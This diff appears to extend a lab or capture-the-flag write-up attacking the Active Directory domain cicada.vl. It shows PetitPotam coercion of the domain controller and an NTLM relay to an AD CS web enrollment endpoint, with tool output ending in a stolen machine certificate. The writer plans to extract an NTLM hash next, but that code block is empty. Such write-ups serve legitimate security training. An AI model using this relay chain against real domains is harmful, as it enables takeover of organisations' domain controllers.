@@ -336,4 +336,25 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powe
 COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
 COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
 ```
-This coerced the DC machine account to connect to NTLMrelayX then 
+This coerced the DC machine account to connect to NTLMrelayX then send the auth to the vulnerable HTTP endpoint to receive a certificate
+
+```python
+[*] (SMB): Received connection from 10.129.234.48, attacking target http://cicada.vl
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.234.48 against http://cicada.vl SUCCEED [1]
+[*] (SMB): Received connection from 10.129.234.48, attacking target http://cicada.vl
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.234.48 against http://cicada.vl SUCCEED [2]
+[*] http:///@cicada.vl [1] -> Generating CSR...
+[*] http:///@cicada.vl [1] -> CSR generated!
+[*] http:///@cicada.vl [1] -> Getting certificate...
+[*] http:///@cicada.vl [2] -> Skipping user  since attack was already performed
+[*] http:///@cicada.vl [1] -> GOT CERTIFICATE! ID 88
+[*] http:///@cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
+[*] http:///@cicada.vl [1] -> Certificate successfully written to file
+```
+Now i have a certificate i can extract a NTLM hash from
+
+```python
+
+```
